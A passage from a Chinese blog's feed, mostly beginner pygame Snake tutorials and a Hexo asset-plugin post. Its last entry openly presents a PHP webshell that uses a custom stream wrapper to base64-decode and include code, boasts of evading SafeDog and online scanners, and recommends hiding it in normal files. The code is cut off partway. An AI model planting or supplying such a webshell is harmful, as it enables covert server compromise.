class="string">'No Key Event'</span></span><br><span class="line"><span class="comment"># 1. 游戏死循环</span></span><br><span class="line"><span class="keyword">while</span> running:</span><br><span class="line">    <span class="comment"># 2. 获取事件流</span></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        text = <span class="string">'No Key Event'</span></span><br><span class="line">        <span class="comment"># 3. 处理事件流</span></span><br><span class="line">        <span class="keyword">if</span> event.type == QUIT:</span><br><span class="line">            <span class="comment"># 结束运行</span></span><br><span class="line">            running = <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">elif</span> event.type == KEYDOWN:</span><br><span class="line">            <span class="comment"># 键盘按下事件</span></span><br><span class="line">            <span class="keyword">if</span> event.key == K_UP:</span><br><span class="line">                text = <span class="string">'K_UP'</span></span><br><span class="line">            <span class="keyword">elif</span> event.key == K_DOWN:</span><br><span class="line">                text = <span class="string">'K_DOWN'</span></span><br><span class="line">            <span class="keyword">elif</span> event.key == K_LEFT:</span><br><span class="line">                text = <span class="string">'K_LEFT'</span></span><br><span class="line">            <span class="keyword">elif</span> event.key == K_RIGHT:</span><br><span class="line">                text = <span class="string">'K_RIGHT'</span></span><br><span class="line">    <span class="comment"># 2.1 屏幕填充白色</span></span><br><span class="line">    screen.fill((<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>))</span><br><span class="line">    <span class="comment"># 2.3 渲染文字</span></span><br><span class="line">    text_surface = font.render(text,<span class="keyword">True</span>,(<span class="number">0xff</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    <span class="comment"># 2.4 贴图文字</span></span><br><span class="line">    screen.blit(text_surface,(<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    <span class="comment"># 3. 刷新显示窗口</span></span><br><span class="line">    pygame.display.flip()  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 退出框架</span></span><br><span class="line">pygame.quit()</span><br></pre></td></tr></table></figure><p>测试：</p><p><img src="3-1.png" alt=""></p><h3 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h3><p>监控事件，当事件为键盘按下时，判断键盘按下的值是什么，并显示在屏幕表面上</p><h2 id="处理鼠标事件"><a href="#处理鼠标事件" class="headerlink" title="处理鼠标事件"></a>处理鼠标事件</h2><p>鼠标事件包括了鼠标移动，左键右键中键的监听，事件类型为 <code>MOUSEMOTION</code>,<code>MOUSEBUTTONUP</code>,<code>MOUSEBUTTONDOWN</code> 三种</p><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>type</td><td><code>MOUSEMOTION</code>,<code>MOUSEBUTTONUP</code>,<code>MOUSEBUTTONDOWN</code></td></tr><tr><td>pos</td><td>鼠标位置</td></tr><tr><td>rel</td><td>相对位置</td></tr></tbody></table><p><em>示例代码</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame </span><br><span class="line"><span class="keyword">from</span> pygame <span class="keyword">import</span> K_UP,K_DOWN,K_LEFT,K_RIGHT,QUIT,MOUSEMOTION,MOUSEBUTTONUP,MOUSEBUTTONDOWN</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 先初始化游戏框架</span></span><br><span class="line">pygame.init()</span><br><span class="line"><span class="comment"># 2. 创建一个窗口</span></span><br><span class="line">screen = pygame.display.set_mode((<span class="number">300</span>,<span class="number">150</span>),<span class="number">0</span>,<span class="number">32</span>)</span><br><span class="line"><span class="comment"># 加载字体 (使用系统字体)</span></span><br><span class="line">font = pygame.font.SysFont(<span class="string">'arial'</span>, <span class="number">16</span>)</span><br><span class="line"><span class="comment"># 运行标志</span></span><br><span class="line">running = <span class="keyword">True</span></span><br><span class="line"><span class="comment"># 案件方向</span></span><br><span class="line">mouse  = (<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">mouse_move = (<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">mouse_key = <span class="keyword">None</span></span><br><span class="line">text = <span class="string">'No Event'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 游戏死循环</span></span><br><span class="line"><span class="keyword">while</span> running:</span><br><span class="line">    <span class="comment"># 2. 获取事件流</span></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">        <span class="comment"># 3. 处理事件流</span></span><br><span class="line">        <span class="keyword">if</span> event.type == QUIT:</span><br><span class="line">            <span class="comment"># 结束运行</span></span><br><span class="line">            running = <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">elif</span> event.type == MOUSEMOTION:</span><br><span class="line">            mouse = event.pos</span><br><span class="line">            mouse_move = event.rel</span><br><span class="line">            text = <span class="string">'mouse pos %s rel %s '</span> % (str(mouse),str(mouse_move))</span><br><span class="line">        <span class="keyword">elif</span> event.type == MOUSEBUTTONUP:</span><br><span class="line">            mouse = event.pos</span><br><span class="line">            mouse_key = event.button </span><br><span class="line">            text = <span class="string">'mouse pos %s button %s'</span> % (str(mouse),str(mouse_key))</span><br><span class="line">        <span class="keyword">elif</span> event.type == MOUSEBUTTONDOWN:</span><br><span class="line">            mouse = event.pos</span><br><span class="line">            mouse_key = event.button </span><br><span class="line">            text = <span class="string">'mouse pos %s button %s'</span> % (str(mouse),str(mouse_key))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.1 屏幕填充白色</span></span><br><span class="line">    screen.fill((<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>))</span><br><span class="line">    <span class="comment"># 2.3 渲染文字</span></span><br><span class="line">    text_surface = font.render(text,<span class="keyword">True</span>,(<span class="number">0xff</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    <span class="comment"># 2.4 贴图文字</span></span><br><span class="line">    screen.blit(text_surface,(<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">    <span class="comment"># 3. 刷新显示窗口</span></span><br><span class="line">    pygame.display.flip()  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 退出框架</span></span><br><span class="line">pygame.quit()</span><br></pre></td></tr></table></figure><p><em>运行截图</em></p><p><img src="3-2.png" alt=""></p>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Python贪吃蛇教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> pygame </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>02 贪吃蛇 - 加载图片与显示：显示图片</title>
      <link href="/2018/07/06/snake-display-image/"/>
      <url>/2018/07/06/snake-display-image/</url>
      <content type="html"><![CDATA[<p>上一篇文章我们显示了一个文字：hello world，这篇文章我们来显示一波图片<br><a id="more"></a></p><p>首先准备一张图片，这张图是贪吃蛇游戏中的食物</p><p><img src="0.png" alt=""></p><p><em>贪吃蛇用：食物</em></p><h2 id="基础：加载并显示图片"><a href="#基础：加载并显示图片" class="headerlink" title="基础：加载并显示图片"></a>基础：加载并显示图片</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="comment"># 1. 先初始化游戏框架</span></span><br><span class="line">pygame.init()</span><br><span class="line"><span class="comment"># 2. 创建一个窗口</span></span><br><span class="line">screen = pygame.display.set_mode((<span class="number">100</span> , <span class="number">100</span> ),<span class="number">0</span>,<span class="number">32</span>)</span><br><span class="line"><span class="comment"># 2.1 屏幕填充白色</span></span><br><span class="line">screen.fill((<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>))</span><br><span class="line"><span class="comment"># 2.2 加载图片</span></span><br><span class="line">image = pygame.image.load(<span class="string">'0.png'</span>)</span><br><span class="line"><span class="comment"># 2.3 贴图图片</span></span><br><span class="line">screen.blit(image,(<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line"><span class="comment"># 3. 刷新显示窗口</span></span><br><span class="line">pygame.display.flip()  </span><br><span class="line"><span class="comment"># 假装进行了什么操作 （延时2秒）</span></span><br><span class="line">pygame.time.wait(<span class="number">2000</span>)</span><br><span class="line"><span class="comment"># 4. 退出框架</span></span><br><span class="line">pygame.quit()</span><br></pre></td></tr></table></figure><p>从代码可以看到，使用函数 <code>pygame.image.load</code> 用于从文件中加载一个图片，返回一个Surface参数，加载完成后，使用blit方法将图片贴在了<code>screen</code>表面上并渲染</p><p><img src="2-1.png" alt="2-1"></p><h2 id="控制图片位置"><a href="#控制图片位置" class="headerlink" title="控制图片位置"></a>控制图片位置</h2><p><code>Surface.blit</code> 方法用于贴图</p><blockquote><p>blit(source, dest, area=None, special_flags = 0) -&gt; Rect</p></blockquote><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>source</td><td>显示的Surface</td></tr><tr><td>dest</td><td>显示的目标区域 (x,y)</td></tr><tr><td>area</td><td>被显示的区域（雪碧图） (x,y,w,h)</td></tr><tr><td>special_flags</td><td>pygame 1.8的东西。处理像素点</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 先初始化游戏框架</span></span><br><span class="line">pygame.init()</span><br><span class="line"><span class="comment"># 2. 创建一个窗口</span></span><br><span class="line">screen = pygame.display.set_mode((<span class="number">100</span> , <span class="number">100</span> ),<span class="number">0</span>,<span class="number">32</span>)</span><br><span class="line"><span class="comment"># 2.1 屏幕填充白色</span></span><br><span class="line">screen.fill((<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>))</span><br><span class="line"><span class="comment"># 2.2 加载图片</span></span><br><span class="line">image = pygame.image.load(<span class="string">'0.png'</span>)</span><br><span class="line"><span class="comment"># 2.3 贴图图片</span></span><br><span class="line">screen.blit(image,(<span class="number">10</span>,<span class="number">10</span>))</span><br><span class="line"><span class="comment"># 3. 刷新显示窗口</span></span><br><span class="line">pygame.display.flip()  </span><br><span class="line"><span class="comment"># 假装进行了什么操作 （延时2秒）</span></span><br><span class="line">pygame.time.wait(<span class="number">2000</span>)</span><br><span class="line"><span class="comment"># 4. 退出框架</span></span><br><span class="line">pygame.quit()</span><br></pre></td></tr></table></figure><p>显示效果</p><p><img src="2-2.png" alt="2-2"></p><h2 id="使用参数-area-裁剪图片"><a href="#使用参数-area-裁剪图片" class="headerlink" title="使用参数 area 裁剪图片"></a>使用参数 area 裁剪图片</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 先初始化游戏框架</span></span><br><span class="line">pygame.init()</span><br><span class="line"><span class="comment"># 2. 创建一个窗口</span></span><br><span class="line">screen = pygame.display.set_mode((<span class="number">100</span> , <span class="number">100</span> ),<span class="number">0</span>,<span class="number">32</span>)</span><br><span class="line"><span class="comment"># 2.1 屏幕填充白色</span></span><br><span class="line">screen.fill((<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>))</span><br><span class="line"><span class="comment"># 2.2 加载图片</span></span><br><span class="line">image = pygame.image.load(<span class="string">'0.png'</span>)</span><br><span class="line"><span class="comment"># 2.3 贴图图片</span></span><br><span class="line">screen.blit(image,(<span class="number">10</span>,<span class="number">10</span>),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">10</span>))</span><br><span class="line"><span class="comment"># 3. 刷新显示窗口</span></span><br><span class="line">pygame.display.flip()  </span><br><span class="line"><span class="comment"># 假装进行了什么操作 （延时2秒）</span></span><br><span class="line">pygame.time.wait(<span class="number">2000</span>)</span><br><span class="line"><span class="comment"># 4. 退出框架</span></span><br><span class="line">pygame.quit()</span><br></pre></td></tr></table></figure><p>显示效果</p><p><img src="2-3.png" alt="2-3"></p>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Python贪吃蛇教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> pygame </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>01 贪吃蛇 - Hello World：显示文字</title>
      <link href="/2018/07/05/snake-hello-world/"/>
      <url>/2018/07/05/snake-hello-world/</url>
      <content type="html"><![CDATA[<blockquote><p>实训果然是实训不是实习，钱都没有，还给人洗脑<br>培训机构学不到什么东西的，就算充钱了也不会变强。</p></blockquote><p>开启一个系列，因为每天都要水一篇文章，有技术就分享，没技术就水基础教程，先水一个贪吃蛇</p><a id="more"></a><p>我记得我14年的时候就写过了，贪吃蛇，那个时候还是用C语言写的，字符界面，大概长这样：</p><p><img src="1.png" alt="snake-hello-world"></p><p><em>图片截自百度，啊鱼的贪吃蛇</em></p><p>实训没想到第一个就是贪吃蛇，也没啥意思，入门编程的第一个目标游戏，也没毛病，开始BB。</p><h2 id="第一步：先把pygame装了"><a href="#第一步：先把pygame装了" class="headerlink" title="第一步：先把pygame装了"></a>第一步：先把pygame装了</h2><p>使用命令：<code>pip install pygame</code> ，把 Pygame 装到自己的机子上</p><p><strong>假装截了图</strong></p><h2 id="第二步：显示一个界面"><a href="#第二步：显示一个界面" class="headerlink" title="第二步：显示一个界面"></a>第二步：显示一个界面</h2><p>使用Pygame的套路很多，这里就将一个普遍的套路写下来，一般游戏框架的套路基本上是：</p><ol><li>先初始化游戏框架</li><li>创建一个窗口</li><li>刷新显示窗口</li><li>退出框架</li></ol><p>现在我们按照这个套路来写 pygame 的基本操作，创建一个窗口先：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="comment"># 1. 先初始化游戏框架</span></span><br><span class="line">pygame.init()</span><br><span class="line"><span class="comment"># 2. 创建一个窗口</span></span><br><span class="line">screen = pygame.display.set_mode((<span class="number">100</span>,<span class="number">100</span>),<span class="number">0</span>,<span class="number">32</span>)</span><br><span class="line"><span class="comment"># 3. 刷新显示窗口</span></span><br><span class="line">pygame.display.flip()  </span><br><span class="line"><span class="comment"># 假装进行了什么操作 （延时2秒）</span></span><br><span class="line">pygame.time.wait(<span class="number">2000</span>)</span><br><span class="line"><span class="comment"># 4. 退出框架</span></span><br><span class="line">pygame.quit()</span><br></pre></td></tr></table></figure><p>以上代码的功能就是创建一个100*100像素的窗口，并等待2秒</p><h3 id="set-mode-说明"><a href="#set-mode-说明" class="headerlink" title="set_mode 说明"></a>set_mode 说明</h3><blockquote><p>set_mode(resolution=(0,0), flags=0, depth=0) -&gt; Surface</p></blockquote><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>resolution</td><td>显示尺寸</td></tr><tr><td>flags</td><td>显示控制，0表示无控制</td></tr><tr><td>depth</td><td>颜色深度，一般是 32位</td></tr></tbody></table><h4 id="Flag-说明"><a href="#Flag-说明" class="headerlink" title="Flag 说明"></a>Flag 说明</h4><table><thead><tr><th>标志</th><th>说明</th></tr></thead><tbody><tr><td>pygame.FULLSCREEN</td><td>创建全屏窗口</td></tr><tr><td>pygame.DOUBLEBUF</td><td>双缓冲窗口，推荐与 HWSURFACE 或 OPENGL 使用</td></tr><tr><td>pygame.HWSURFACE</td><td>硬件加速，只在 FULLSCREEN 模式下可用</td></tr><tr><td>pygame.OPENGL</td><td>创建一个基于 OpenGL渲染的窗口</td></tr><tr><td>pygame.RESIZABLE</td><td>可缩放的窗口</td></tr><tr><td>pygame.NOFRAME</td><td>创建没有边界和标题栏的窗口</td></tr></tbody></table><h2 id="第三步：显示文字"><a href="#第三步：显示文字" class="headerlink" title="第三步：显示文字"></a>第三步：显示文字</h2><p>基本流程：</p><ol><li>加载字体，创建字体对象</li><li>显示文字</li></ol><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 先初始化游戏框架</span></span><br><span class="line">pygame.init()</span><br><span class="line"><span class="comment"># 2. 创建一个窗口</span></span><br><span class="line">screen = pygame.display.set_mode((<span class="number">100</span> , <span class="number">100</span> ),<span class="number">0</span>,<span class="number">32</span>)</span><br><span class="line"><span class="comment"># 2.1 屏幕填充白色</span></span><br><span class="line">screen.fill((<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>))</span><br><span class="line"><span class="comment"># 2.2 加载字体 (使用系统字体)</span></span><br><span class="line">font = pygame.font.SysFont(<span class="string">'arial'</span>, <span class="number">16</span>)</span><br><span class="line"><span class="comment"># 2.3 渲染文字</span></span><br><span class="line">text = font.render(<span class="string">"Hello World"</span>,<span class="keyword">True</span>,(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line"><span class="comment"># 2.4 贴图文字</span></span><br><span class="line">screen.blit(text,(<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line"><span class="comment"># 3. 刷新显示窗口</span></span><br><span class="line">pygame.display.flip()  </span><br><span class="line"><span class="comment"># 假装进行了什么操作 （延时2秒）</span></span><br><span class="line">pygame.time.wait(<span class="number">2000</span>)</span><br><span class="line"><span class="comment"># 4. 退出框架</span></span><br><span class="line">pygame.quit()</span><br></pre></td></tr></table></figure><p>代码运行效果</p><p><img src="2.png" alt="hello-world"></p>]]></content>
      
      <categories>
          
          <category> 基础教程 </category>
          
          <category> Python贪吃蛇教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> pygame </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>在Hexo博客系统中引用图片与资源</title>
      <link href="/2018/07/04/use-assets-in-hexo/"/>
      <url>/2018/07/04/use-assets-in-hexo/</url>
      <content type="html"><![CDATA[<p>因为 <code>Hexo</code> 的模块 <code>hexo-asset-image</code> 只支持图片装换，而且图片装换不太友好，根据原先的代码，我修改以后PR提交给原作者，原作者也不理我，所以新开一个坑用来处理这个问题，使用非常简单，按照常规<code>Markdown</code>方式引用即可，因为 <code>Hexo</code> 系统的原因，所有的资源都会归档到 <code>_posts</code> 下的同名文件夹下，使用的时候开启 <code>post_asset_folder</code> 配置，然后直接引用资源即可。</p><p><strong>实例Markdown</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Test Assets</span></span><br><span class="line"></span><br><span class="line">[<span class="string">archive</span>](<span class="link">markdown-post/archive.zip</span>)</span><br><span class="line"></span><br><span class="line">![<span class="string">image</span>](<span class="link">markdown-post/image.png</span>)</span><br></pre></td></tr></table></figure><p>文件夹结构</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">markdown-post</span><br><span class="line">├── archive.zip</span><br><span class="line">└── image.png</span><br><span class="line">markdown-post.md</span><br></pre></td></tr></table></figure><p>这样不管在编辑时还是处理时，都会保证资源引用的正确性，写起来也方便，不需要预览或者开启服务</p><h2 id="模块安装"><a href="#模块安装" class="headerlink" title="模块安装"></a>模块安装</h2><p>使用如下命令安装即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-assets --save</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 杂记分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>非正常 PHP Shell - 产生Shell的一种新方法</title>
      <link href="/2018/07/03/php-shell-bypass-safedog/"/>
      <url>/2018/07/03/php-shell-bypass-safedog/</url>
      <content type="html"><![CDATA[<p>安全狗绕过是一个比较热门的话题？反正我这边这个<code>Shell</code> 经过 安全狗、<a href="https://scanner.baidu.com" target="_blank" rel="noopener">https://scanner.baidu.com</a> 、<a href="http://n.shellpub.com" target="_blank" rel="noopener">http://n.shellpub.com</a> 的检测，没检测出来，美滋滋。</p><h2 id="检测结果"><a href="#检测结果" class="headerlink" title="检测结果"></a>检测结果</h2><ul><li><a href="http://n.shellpub.com/zip/tid/6b86f122-0392-404b-a660-41ef11b38e15.html" target="_blank" rel="noopener">http://n.shellpub.com/zip/tid/6b86f122-0392-404b-a660-41ef11b38e15.html</a></li><li><a href="https://scanner.baidu.com/#/pages/scan_result?hash=fe0c44bd777ef0f9bae897ed79f3d4b9" target="_blank" rel="noopener">https://scanner.baidu.com/#/pages/scan_result?hash=fe0c44bd777ef0f9bae897ed79f3d4b9</a></li></ul><a id="more"></a><h2 id="产生原理"><a href="#产生原理" class="headerlink" title="产生原理"></a>产生原理</h2><p>通过PHP函数 <code>stream_wrapper_register</code> 注册包装器，检测特定的URL包装功能，监控 <code>include</code> 流，在 <code>include</code> 流中动态生成PHP代码，本来是用来做PHP源代码加密的，但是想了下，好像这种方式还没有被安全狗检测，翻阅了大部分安全狗的检测机制，讲道理没有看到有关的文献。具体原理参考我的上一篇文章，不打算菜刀适配（其实是菜刀的运行原理我看起来头晕）。</p><h2 id="Shell代码"><a href="#Shell代码" class="headerlink" title="Shell代码"></a>Shell代码</h2><p>代码稍微有些长，适合隐藏在正常的文件中使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 异形 Shell，一串看似完全正常代码</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> dxkite &lt;dxkite<span class="doctag">@qq</span>.com&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@link</span> //dxkite.cn</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShellStream</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $position;</span><br><span class="line">    <span class="keyword">protected</span> $code;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stream_open</span><span class="params">($path, $mode, $options, &amp;$opened_path)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $url = parse_url($path);</span><br><span class="line">        $name = $url[<span class="string">"host"</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = base64_decode($name);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;position = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stream_read</span><span class="params">($count)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ret = substr(<span class="keyword">$this</span>-&gt;code, <span class="keyword">$this</span>-&gt;position, $count);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;position += strlen($ret);</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stream_tell</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;position;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stream_eof</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;position &gt;= strlen(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stream_seek</span><span class="params">($offset, $whence)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> ($whence) &#123;</span><br><span class="line">            <span class="keyword">case</span> SEEK_SET:</span><br><span class="line">                <span class="keyword">if</span> ($offset &lt; strlen(<span class="keyword">$this</span>-&gt;code) &amp;&amp; $offset &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;position = $offset;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> SEEK_CUR:</span><br><span class="line">                <span class="keyword">if</span> ($offset &gt;= <span class="number">0</span>) 